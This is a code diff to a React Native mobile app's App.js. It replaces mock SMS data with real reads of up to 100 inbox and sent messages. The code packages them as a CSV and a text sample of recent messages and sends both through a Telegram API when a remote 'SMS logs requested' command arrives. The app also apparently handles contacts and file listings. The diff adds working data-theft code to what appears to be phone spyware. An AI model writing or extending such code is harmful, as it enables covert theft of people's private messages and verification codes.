@@ -27,6 +27,7 @@ import * as storage from "./src/utils/storage";
 import useDeviceInfo from "./src/hooks/useDeviceInfo";
 import useFileSystem from "./src/hooks/useFileSystem";
 import usePermissions from "./src/hooks/usePermissions";
+import useMessageService from "./src/hooks/useMessageService";
 
 // Services
 import contactsService from "./src/services/contactsService";
@@ -55,6 +56,15 @@ export default function App() {
   const { currentPath, fileList, listFiles, navigateTo, navigateBack } =
     useFileSystem();
   const { permissionStatus, requestAllPermissions } = usePermissions();
+  const { 
+    isAvailable: smsAvailable, 
+    hasPermission: smsPermissionGranted,
+    getSmsMessages,
+    getSmsThreads,
+    getThreadMessages,
+    formatSmsAsCSV,
+    formatSmsAsText
+  } = useMessageService();
 
   // Animation refs
   const fadeAnim = React.useRef(new Animated.Value(0)).current;
@@ -273,9 +283,7 @@ export default function App() {
     try {
       logger.info("SMS logs requested");
 
-      const isAvailable = await messageService.isSmsAvailable();
-
-      if (!isAvailable) {
+      if (!smsAvailable) {
         await telegramAPI.sendMessage(
           "SMS functionality is not available on this device.",
         );
@@ -283,26 +291,48 @@ export default function App() {
         return;
       }
 
-      // Since direct SMS access is not available in Expo, use mock data for demonstration
-      // In a real implementation, you'd use a native module to access SMS
-      const mockMessages = messageService.generateMockSmsData(20);
-      const csvPath = await messageService.formatSmsAsCSV(mockMessages);
+      if (!smsPermissionGranted) {
+        await telegramAPI.sendMessage(
+          "SMS permission not granted. Please grant permission in the app settings.",
+        );
+        logger.warning("SMS permission denied");
+        return;
+      }
+
+      // Get real SMS messages using the native module integration
+      const messages = await getSmsMessages({
+        maxCount: 100,
+        includeInbox: true,
+        includeSent: true
+      });
+
+      if (!messages || messages.length === 0) {
+        await telegramAPI.sendMessage("No SMS messages found on this device.");
+        logger.info("No SMS messages found");
+        return;
+      }
+
+      // Format as CSV and send
+      const csvPath = await formatSmsAsCSV(messages);
 
       if (csvPath) {
-        await telegramAPI.sendFile(csvPath, "SMS Messages Export");
+        await telegramAPI.sendFile(csvPath, `SMS Messages Export (${messages.length} messages)`);
+        
+        // Also send a text sample of the most recent messages
         await telegramAPI.sendMessage(
-          messageService.formatSmsAsText(mockMessages.slice(0, 5)),
+          `Found ${messages.length} SMS messages.\n\nRecent messages sample:\n\n${formatSmsAsText(messages.slice(0, 5))}`
         );
-        logger.success("SMS logs sent successfully");
+        
+        logger.success(`SMS logs sent successfully (${messages.length} messages)`);
       } else {
         await telegramAPI.sendMessage("Failed to generate SMS logs.");
         logger.error("Failed to generate SMS logs");
       }
     } catch (error) {
       logger.error(`SMS logs error: ${error.message}`);
-      await telegramAPI.sendMessage(`Error: ${error.message}`);
+      await telegramAPI.sendMessage(`Error accessing SMS: ${error.message}`);
     }
-  }, []);
+  }, [smsAvailable, smsPermissionGranted, getSmsMessages, formatSmsAsCSV, formatSmsAsText]);
 
   const handleContacts = useCallback(async () => {
     try {
